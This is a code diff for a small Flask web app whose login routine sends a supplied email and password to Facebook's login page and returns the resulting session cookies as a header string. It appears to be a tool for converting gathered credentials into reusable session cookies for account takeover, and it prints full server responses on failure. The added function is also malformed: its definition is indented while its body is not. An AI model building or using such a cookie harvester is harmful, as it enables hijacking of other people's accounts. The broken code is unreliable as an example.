@@ -29,25 +29,28 @@ def index():
 
     return render_template_string(HTML_TEMPLATE, cookies_list=None)
 
-def process_login(email, password):
-    # Use the requests library for login
-    session = requests.Session()
 
-    login_url = "https://www.example.com/login"  # This is a placeholder. You will need to adjust it.
+    def process_login(email, password):
+    session = requests.Session()
+    
+    login_url = "https://www.facebook.com/login"  # Update with correct login URL
     login_data = {
         "email": email,
-        "password": password
+        "pass": password
     }
-
+    
     response = session.post(login_url, data=login_data)
-
+    
+    # Check the response status and print content for debugging
     if response.status_code == 200:
+        print("Login successful!")
         cookies = session.cookies.get_dict()
         cookie_header = "; ".join([f"{key}={value}" for key, value in cookies.items()])
         return {"email": email, "cookies": cookie_header}
     else:
+        print(f"Failed login for {email}, Status Code: {response.status_code}")
+        print("Response content:", response.text)  # Print the response content to debug the issue
         return {"error": f"Login failed for {email}"}
-
 # HTML Template
 HTML_TEMPLATE = """
 <!DOCTYPE html>
